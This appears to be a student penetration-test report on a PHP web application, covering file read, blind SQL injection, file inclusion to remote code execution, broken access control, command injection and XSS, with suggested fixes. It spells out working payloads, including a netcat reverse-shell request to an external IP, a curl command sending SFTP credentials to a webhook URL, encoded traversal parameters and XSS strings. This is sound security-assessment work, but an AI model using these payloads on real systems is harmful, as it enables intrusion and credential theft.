# PenTest #1

## Local File Read through Download Functionality

By downloading a valid file hash, we are redirected to `/d?filepath=XXX&tmpDir=XXX`. 

This can be seen by using Burp Suite Repeater to repeat the `POST` request to `/download` endpoint. The response status code returns with a `302 Found`.

![](images/Pasted%20image%2020230130183330.png)

By following this redirection, we see the subsequent `GET` request to `/d`.
![](images/Pasted%20image%2020230130183446.png)

Decoding the respective parameters gives us 

```
filepath = inetpub/ftproot/d41d8_463e7c4afa37cd074a1bd1d234f1c69f.txt
tmpDir = C:\Temp\
```

Knowing the underlying base64 decoded values, we could try to replace the `filepath` and `tmpDir` values to a desired file we want.

As a PoC, we could try obtaining the `config.php` which contains credentials used by the application. To obtain the `config.php`, we can access 

```
filepath = config.php
tmpDir = C:\\inetpub\\wwwroot\\
```

Then by base64 encoding the respective values above and sending the request in repeater. We are able to obtain the contents of `config.php` as seen in the screenshot below.

![](images/Pasted%20image%2020230130184440.png)

Hence, the lack of santization and passing of dynamic directory paths i.e. `tmpDir`, resulted in an unauthorized local file read in the application server.

### Fix

A suggested fix would be completely remove the usage of `tmpDir` as a passed parameter, and instead lock down the `tmpDir` to a specific directory value, which is likely to be just `C:\Temp\`. 

### PoC 

The PoC for the local file read can be found at `PenTest/PoCs/Local File Inclusion to RCE/poc.py`

> PoC payload for Burp Suite Repeater
> `/d?filepath=Li4vaW5ldHB1Yi93d3dyb290L2NvbmZpZy5waHA=&tmpDir=QzpcVGVtcFw=`

## SQL injection in download functionality

In the download functionality, there is a blind SQL injection. When requesting for a `'`, triggers a SQL error.

![](images/Pasted%20image%2020230125204350.png)

This suggests that we can potentially make use of this vector to perform a SQL injection. From here, let's try to trigger a false vs true statement to see the difference.

Starting with a true statement,
![](images/Pasted%20image%2020230125204705.png)

We can see a 302 Found redirection. What about false condition?

Testing out with a false statement,
![](images/Pasted%20image%2020230125204741.png)

We now get 500 Internal Server Found.

Here, we are given 2 different responses 
1. 302 for true
2. 500 for false

This will help us with a Blind SQL injection to determine the admin's hash. To obtain the admin hash, we simply need to perform a binary search on the hash value from the user table.

A PoC can be found in this repository under `PenTest/PoCs/Blind SQLi/poc.py`. And running that PoC should present the following.

```
...
Found! Uncompleted token: 770e9c359c2ec15c051a9c3d67df377
Testing 770e9c359c2ec15c051a9c3d67df377a
Testing 770e9c359c2ec15c051a9c3d67df377b
Testing 770e9c359c2ec15c051a9c3d67df377c
Testing 770e9c359c2ec15c051a9c3d67df377d
Testing 770e9c359c2ec15c051a9c3d67df377e
Testing 770e9c359c2ec15c051a9c3d67df377f
Testing 770e9c359c2ec15c051a9c3d67df3770
Testing 770e9c359c2ec15c051a9c3d67df3771
Testing 770e9c359c2ec15c051a9c3d67df3772
Testing 770e9c359c2ec15c051a9c3d67df3773
Testing 770e9c359c2ec15c051a9c3d67df3774
Testing 770e9c359c2ec15c051a9c3d67df3775
Testing 770e9c359c2ec15c051a9c3d67df3776
Found! Uncompleted token: 770e9c359c2ec15c051a9c3d67df3776
Final token: 770e9c359c2ec15c051a9c3d67df3776
With nullbytes (Actual Token): YQBkAG0AaQBuADoANwA3ADAAZQA5AGMAMwA1ADkAYwAyAGUAYwAxADUAYwAwADUAMQBhADkAYwAzAGQANgA3AGQAZgAzADcANwA2AA==
Without nullbytes(For Testing): YWRtaW46NzcwZTljMzU5YzJlYzE1YzA1MWE5YzNkNjdkZjM3NzY=
...
```

> During test, if we were to use the token generated without nullbytes, the cookies are deleted upon refreshing... This suggests that likely the token doesn't match the one in the database. Instead the one with nullbytes keeps the cookies, persisting the session.

And by using the "Actual Token" in the PoC output, and replacing the browser's `token`. Then by refreshing the page, we should now be admin and the cookies should not be deleted.

![](images/Pasted%20image%2020230125205332.png)

### Fix

Either parameterize the hash input OR sanitize the input hash value to accept charset of only `a-f0-9_`, or with similar sanitization done on `auth.php`.

## Local File Inclusion to RCE

In the `admin.php`, there exists a `else` clause which surprisingly just `includes` whatever is pass into the `page` parameter. This means that, if we were to include a PHP shell, this might allow us to run arbitary commands.

To start, we can upload a shell onto the server first.

![](images/Pasted%20image%2020230201224525.png)

> The file hash can be manually derived through manual testing the filename and contents with MD5 hashing.

(1) shows the contents of the PHP shell we are uploading and (2) refers to the generated file hash. We will need this file hash to perform the local file inclusion to run our shell.

Based on the exfiltrated source codes, `C:\\inetpub\\ftproot\\` contains our uploaded shell. And our current working directory is `C:\\inetpub\\wwwroot\\`.

Hence, for us to perform the local file inclusion on the PHP shell file, we need to include `../ftproot/<filehash>.php`. And to run our command, we need to pass the `cmd` GET parameter.

As a simple PoC using Burp Suite, we will run the `hostname` and `ipconfig` command.

![](images/Pasted%20image%2020230202003606.png)

Sending the requests returns the response containg the command outputs of `hostname` and `ipconfig` respectively as expected.


### To get reverse connection (To be removed)

> `nc64.exe` binary from https://github.com/int0x33/nc.exe

First set up a listener 
```
# Using a common port in case of firewall rules.
nc -lvp 80
```

Upload a `nc64.exe` binary into the server. Use the newly generated name and run it to reverse connect to attacker server.

```

http://54.251.213.12/admin?page=../ftproot/57956_0a3fcfabd7eb193930fdfe54de0ddedc.php&cmd=c:\inetpub\ftproot\52361_75c096b74acd25b7b5d9108fd00ec11c.exe%20-e%20cmd.exe%2034.142.216.72%2080

```

On our listener, we can see the reverse connection and get access to the machine's terminal. As a proof of concept, we can dump our the current state of the directory, the current user, ip configuration and datetime.

![](images/Pasted%20image%2020230120165141.png)

#### Backup request body
```
GET /admin?page=../ftproot/57956_0a3fcfabd7eb193930fdfe54de0ddedc.php&cmd=c:\inetpub\ftproot\52361_75c096b74acd25b7b5d9108fd00ec11c.exe%20-e%20cmd.exe%2034.142.216.72%2080 HTTP/1.1
Host: 54.251.213.12
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jk5ej5g401k5a4hm3v8s7d2p45; token=YQBkAG0AaQBuADoANwA3ADAAZQA5AGMAMwA1ADkAYwAyAGUAYwAxADUAYwAwADUAMQBhADkAYwAzAGQANgA3AGQAZgAzADcANwA2AA==
Connection: close

```

### Fix

Simply remove the `else` clause. Since the functionality seems to imply the only intended functionalities are `files`, `general`, `users` and `logs`.

## Broken "AD" Authentication to SQL injection

There is a broken "AD" authentication leading to SQL injection.

In the following `login.php`, 

```
        <?php
        if(isset($_POST["submit"])) {
                include("auth.php");
                $authType = base64_decode($_POST["authType"]);
                if(contains("AD", $authType))
                {
                        authenticate_internal($authType, $_POST["user"], $_POST["password"], $db);
                }
                elseif(contains("External", $authType))
                {
                        authenticate_external($authType, $_POST["user"], $_POST["password"], $db);
                }
        }
        ?>
        </p>
```

We can see it checks if `$authType` contains `AD` before passing to `authenticate_internal()`.

However, when it gets passed to `authenticate_internal()` in `auth.php`, the check is changed to `if ($authType == "AD")` as seen in the snippet below

```
function authenticate_internal($authType, $user, $password, $db)
{
        if ($authType == "AD")
        {
                $ldap = ldap_connect("ldap.domain.com");
                if ($bind = ldap_bind($ldap, $user, $password)) {
                        $row = get_row($user, $db);
                        setcookie("token", $row['token'], 0, '/');
                header("Location: index.php");
                } else {
                  echo "Wrong username or password.";
                }
        }

        else
        {
                $row = get_row($user, $db);
                setcookie("token", $row['token'], 0, '/');
        header("Location: index.php");
        }
}
```

This means that as long as our `$authType` contains `AD` and not equals to `AD`, we can access the `else` branch which calls `get_row()` as seen below without any santization such as `addslashes()`.

```
function get_row($user, $db)
{
        $ses_sql = mysqli_query($db, "SELECT * FROM users WHERE user='" . $user . "'");
    $row = mysqli_fetch_array($ses_sql,MYSQLI_ASSOC);
    return $row;
}
```

This means that if we were to inject a single quote into the `$user` variable, we may be able to see some errors regarding SQL unless error messages are disabled.

We can test this out by using Burp's repeater on the `/login` endpoint.

![](images/Pasted%20image%2020230130190249.png)

This proves that we are able to make use of the `user` field to inject SQL injection to potentially leak user credentials found in the database.

Using a PoC script found at `PenTest/PoCs/Login Blind SQL injection/poc.py`, we can leak out the admin hash as a PoC.

Running the script should reveal the admin hash and the hash length as a PoC.
```
...
Testing 770e9c359c2ec15c051a9c3d67df377e
Testing 770e9c359c2ec15c051a9c3d67df377f
Testing 770e9c359c2ec15c051a9c3d67df3770
Testing 770e9c359c2ec15c051a9c3d67df3771
Testing 770e9c359c2ec15c051a9c3d67df3772
Testing 770e9c359c2ec15c051a9c3d67df3773
Testing 770e9c359c2ec15c051a9c3d67df3774
Testing 770e9c359c2ec15c051a9c3d67df3775
Testing 770e9c359c2ec15c051a9c3d67df3776
Found! Uncompleted token: 770e9c359c2ec15c051a9c3d67df3776
Hash length is 32
Password hash is 770e9c359c2ec15c051a9c3d67df3776
```

### Fix

The suggested fix would be add input santization such as `addslashes()` as done in `authenticate_external()`.

## Broken Access Control - Unauthorized User Actions and Access

An unauthenticated user can access privileged pages/actions using appending the following cookies to a request
```
token=ANYTHING; is_admin=1;
```

We are able to perform high privileged actions such as creating a new user with admin privileges. In this PoC, creating a privileged user called `existential_crisis`.

![](images/Pasted%20image%2020230202193006.png)

### Fix

To simply add checks on the token cookie to each page/action and furthermore, when the check in `check.php` fails to match the exact `token`, immediately return an error page.

Sample example:

```
if ($token) {
    $ses_sql = mysqli_query($db, "SELECT * FROM users WHERE token='" . $token . "'");
    $row = mysqli_fetch_array($ses_sql,MYSQLI_ASSOC);
    if (isset($row)) {
        $_COOKIE['token'] = $row['token'];
        $_COOKIE['is_admin'] = $row['is_admin'];
    }
    else
        {
                setcookie("token", "", time() - 3600);
                setcookie("is_admin", "", time() - 3600);
                // Explicitly route
                header("Location: 404.php");
                exit();
        }
```

## Command injection to SSRF in `admin.php`

There exists a command injection vulnerability in `admin.php` which can be leveraged to perform SSRF to leak SFTP credentials.

Under `/admin?page=files`, when a POST request is made, it attempts to delete a desired uploaded file. However, because we control the user input (i.e. `filepath`), we can inject arbitary commands.

PoC Screenshot using burp suite repeater.
![](images/Pasted%20image%2020230201085846.png)

(1) refers to the payload we want to inject to trigger a SSRF through command injection, since if we were to refer to the source code snippet,

```
...
                if (isset($_POST["filepath"]))
                {
                        $decoded_filepath = base64_decode($_POST["filepath"]);
                        $sftp_server = "ftp://127.0.0.1/";
                        $curl = CURL_PATH;
                        $cmd = $curl . " -k  \"" . $sftp_server . "\" --user \"" . SFTP_USERNAME . ":" . SFTP_PASSWORD . "\" -Q \"-DELE /" . $decoded_filepath . "\"";
                        $dump = "";
                        $rstatus = "";
                        exec($cmd, $dump, $rstatus);
...
```

We can see that no sanitization of the decoded filepath is done, and immediately appended into the `$cmd` variable.

This results in the following `$cmd` being crafted

```
<curl-binary> -k "<SFTP-server>" --user "<SFTP-user>:<SFTP-password>" -Q "-DELE /inetpub/ftproot/336e4_098f6bcd4621d373cade4e832627b4f6.txt"; $curl "https://webhook.site/bf87cb72-5b99-415f-8602-16b1cd5f669c"
```

And since this is passed into `exec()`, the server should first run 

```
<curl-binary> -k "<SFTP-server>" --user "<SFTP-user>:<SFTP-password>" -Q "-DELE /inetpub/ftproot/336e4_098f6bcd4621d373cade4e832627b4f6.txt"
```

Then runs the second command which performs a SSRF to a server we control.

> Note that `$curl` becomes `C:\\inetpub\\wwwroot\\bin\\curl.exe` due to how PHP replaces `$curl` enclosed in double quotes with the value of `$curl`. 

```
C:\\inetpub\\wwwroot\\bin\\curl.exe "https://webhook.site/bf87cb72-5b99-415f-8602-16b1cd5f669c"
```

Refering back to our image, 
![](images/Pasted%20image%2020230201085846.png)

We can see from (2) that, a request was successfully sent over. Furthermore by refering to (3), we can see that the SFTP credentials are leaked in the request headers - likely due to how the curl was configured.

### PoC Payload

Command injection payload

```
filepath=aW5ldHB1Yi9mdHByb290LzMzNmU0XzA5OGY2YmNkNDYyMWQzNzNjYWRlNGU4MzI2MjdiNGY2LnR4dCI7QzpcXGluZXRwdWJcXHd3d3Jvb3RcXGJpblxcY3VybC5leGUgImh0dHBzOi8vd2ViaG9vay5zaXRlL2ZhZWFjYjQ4LWY1YjAtNGU1Ni1hZjQxLWNmMjA2Mjg2NTA3Mw%3d%3d

# Decodes to 
inetpub/ftproot/336e4_098f6bcd4621d373cade4e832627b4f6.txt";C:\\inetpub\\wwwroot\\bin\\curl.exe "https://webhook.site/faeacb48-f5b0-4e56-af41-cf2062865073
```

There seems to be an `exec()` command being used to run the `$cmd`. However, it seems that no sanitization is done prior to crafting the `$cmd` string despite taking in user input, i.e. the `tmp_name` which we control.

### Fix

The likely fix would be to whitelist valid characters e.g. `a-zA-Z0-9./`. This would prevent escaping of template commands to inject arbitary commands.

### Affected Targets

```
admin.php
upload.php
d.php
```

## Reflected XSS on `index` page

Modifying the `token` and injecting XSS under `user` field, will result in the script payload being rendered upon refreshing. Low severity due to it being reflected.

Example
```
# Inside cookies
token=PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ%2b

# Decodes to <script>alert(document.domain)</script>
# Can also add alert(`IFS4205_GROUP1`) as additional proof.
```

## Stored XSS on Admin's User List Page

As an admin user, one can inject a stored XSS into the User list page by injecting XSS when creating a new username, this can be potentially used to deny access to the user list page completely.

```
username: <script>alert(document.domain);alert(`IFS4205_GROUP1`)</script>
password: PWNED
```


## Enumerated Information

Source files found in `extractedSource` after exfiltration.

Web related files/directories at `C:\inetpub\wwwroot\` based on triggering of errors.

For Uploaded files, they are stored in `C:\inetpub\ftproot\` based on the `uploadDir` found in the upload request.

### Users Table

1. user
2. password (more accurately, hashed password)
3. token
4. ???

> `token` used for cookie session. This might be the key to escalate to admin dashboard.

Token is generated by `base64(<user>:md5(password))`.

Furthermore, the characters before base64 encoding are appended with a `\x00` each.

This can be checked by decoding the normal user's `token` cookie.

### Generated Uploaded Hash

The format of the uploaded file name hash is generated by the following
```
<md5 of file content [0-5]>_<md5 of filename WO extension>
```

#### Additional Comments

As of testing, something seemed to have changed in the token or something. It used to have null bytes after each characters in the token. But now it doesnt...

Most original token used for `user` 
```
token=dQBzAGUAcgA6ADUAZgA0AGQAYwBjADMAYgA1AGEAYQA3ADYANQBkADYAMQBkADgAMwAyADcAZABlAGIAOAA4ADIAYwBmADkAOQA%3D;
```



## Other attacks to look at

### Potential CSRF (Not tested)

https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf

## Generated Artifacts

```
# New admin user
iu
existential_crisis
existential_crisis_1
```


## Backup

### Deleting XSS user for Testing

```
POST /admin?page=users HTTP/1.1
Host: 54.251.213.12
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://54.251.213.12
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://54.251.213.12/admin?page=users
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=h2b02rjcsidqfnrgdjobkoaa9g; token=YQBkAG0AaQBuADoANwA3ADAAZQA5AGMAMwA1ADkAYwAyAGUAYwAxADUAYwAwADUAMQBhADkAYwAzAGQANgA3AGQAZgAzADcANwA2AA==
Connection: close

delete_user='%20or%20id=23;#
```